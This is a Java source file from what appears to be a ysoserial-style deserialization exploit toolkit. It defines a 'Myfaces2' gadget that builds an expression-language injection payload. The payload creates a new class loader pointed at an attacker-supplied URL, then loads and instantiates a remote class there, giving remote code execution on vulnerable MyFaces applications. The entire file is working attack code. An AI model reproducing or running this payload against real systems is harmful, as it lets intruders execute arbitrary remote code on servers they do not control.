package com.qi4l.JYso.gadgets;

public class Myfaces2 implements ObjectPayload<Object>, DynamicDependencies {
    @Override
    public Object getObject(String command) throws Exception {

        int sep = command.lastIndexOf(':');
        if (sep < 0) {
            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
        }

        String url       = command.substring(0, sep);
        String className = command.substring(sep + 1);

        // based on http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
        String expr = "${request.setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}";

        // if we add fewer than the actual classloaders we end up with a null entry
        for (int i = 0; i < 100; i++) {
            expr += "${request.getAttribute('arr').add(request.servletContext.getResource('/').toURI().create('" + url + "').toURL())}";
        }
        expr += "${request.getClass().getClassLoader().newInstance(request.getAttribute('arr')"
                + ".toArray(request.getClass().getClassLoader().getURLs())).loadClass('" + className + "').newInstance()}";

        return Myfaces1.makeExpressionPayload(expr);
    }
}
